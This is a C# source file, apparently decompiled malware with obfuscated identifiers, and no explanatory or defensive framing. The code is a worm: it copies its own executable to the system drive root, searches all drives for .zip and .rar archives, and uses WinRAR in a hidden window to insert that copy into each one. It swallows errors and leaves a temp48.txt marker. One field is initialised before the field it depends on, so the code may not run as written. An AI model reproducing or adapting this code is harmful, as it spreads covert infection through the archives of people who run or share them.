using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using Microsoft.VisualBasic.CompilerServices;

[StandardModule]
internal sealed class msekn
{
	private static object m91v = new StringBuilder(255);

	private static string eywtm = eou8f.ToString();

	private static string ffem7;

	private static string k314s;

	private static string[] wl32b;

	private static string[] p68qr = Environment.GetLogicalDrives();

	private static string tlbvb = Environment.GetFolderPath(Environment.SpecialFolder.System);

	private static string ilbd1 = tlbvb.Replace(tlbvb.Substring(tlbvb.IndexOf("\\")), string.Empty) + "\\";

	private static object eou8f = new StringBuilder(255);

	private static ProcessStartInfo tyzgz = new ProcessStartInfo();

	[DllImport("kernel32.dll", CharSet = CharSet.Auto)]
	public static extern int xh74y([MarshalAs(UnmanagedType.LPTStr)] string path, [MarshalAs(UnmanagedType.LPTStr)] StringBuilder shortPath, int shortPathLength);

	private static void cq2mf(string a4kr1)
	{
		string[] directories = Directory.GetDirectories(a4kr1);
		wl32b = Directory.GetFiles(a4kr1);
		string[] array = wl32b;
		foreach (string text in array)
		{
			if (text.Contains(".rar"))
			{
				toyqm(text);
			}
			if (text.Contains(".zip"))
			{
				toyqm(text);
			}
		}
		string[] array2 = directories;
		foreach (string a4kr2 in array2)
		{
			cq2mf(a4kr2);
		}
	}

	public static void xnqfi(string krbzs)
	{
		k314s = krbzs;
		string[] array = p68qr;
		foreach (string a4kr in array)
		{
			cq2mf(a4kr);
		}
		x1m2t();
	}

	public static void toyqm(string z8dd3)
	{
		ffem7 = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + "\\WinRAR\\WinRAR.exe";
		if (File.Exists(ffem7))
		{
			if (!File.Exists(Path.Combine(ilbd1, k314s)))
			{
				qigav();
			}
			xeb91();
			xh74y(z8dd3, (StringBuilder)m91v, Conversions.ToInteger(NewLateBinding.LateGet(m91v, (Type)null, "Capacity", new object[0], (string[])null, (Type[])null, (bool[])null)));
			try
			{
				string arguments = " a " + m91v.ToString() + " " + eywtm;
				czqxd();
				tyzgz.Arguments = arguments;
				tyzgz.WindowStyle = ProcessWindowStyle.Hidden;
				Process.Start(tyzgz);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
	}

	private static void xeb91()
	{
		xh74y(Path.Combine(ilbd1, k314s), (StringBuilder)eou8f, Conversions.ToInteger(NewLateBinding.LateGet(eou8f, (Type)null, "Capacity", new object[0], (string[])null, (Type[])null, (bool[])null)));
	}

	private static void x1m2t()
	{
		File.Create(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\temp48.txt");
	}

	private static void qigav()
	{
		File.Copy(Process.GetCurrentProcess().MainModule!.FileName, Path.Combine(ilbd1, k314s));
	}

	private static void czqxd()
	{
		tyzgz.FileName = ffem7;
	}
}
